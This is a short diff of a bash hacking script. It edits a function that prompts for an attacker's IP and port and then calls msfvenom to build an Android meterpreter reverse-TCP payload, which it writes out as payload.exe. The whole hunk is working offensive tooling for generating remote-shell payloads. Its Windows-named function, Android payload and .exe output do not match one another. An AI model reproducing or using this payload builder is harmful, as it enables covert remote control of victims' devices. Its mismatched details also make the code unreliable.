@@ -53,10 +53,10 @@ function nmapscan() {
 #Funcion shell reversa con meterpreter
 function winrev() {
 	PAYLOAD="android/meterpreter/reverse_tcp"
-	read-p $'\e[1;93mInput your ip\e[0m\n" HOST
-	read $PORT
-	read $DIR
-	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR
+	read -p $'\e[1;92mInput your ip\e[0m \n' HOST
+	read -p $'\e[1;92mInput your port for forward\e[0m \n' PORT
+	read -p $'\e[1;92mInput the directory to save payload\e[0m \n'	DIR
+	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR/payload.exe
 
 }
 
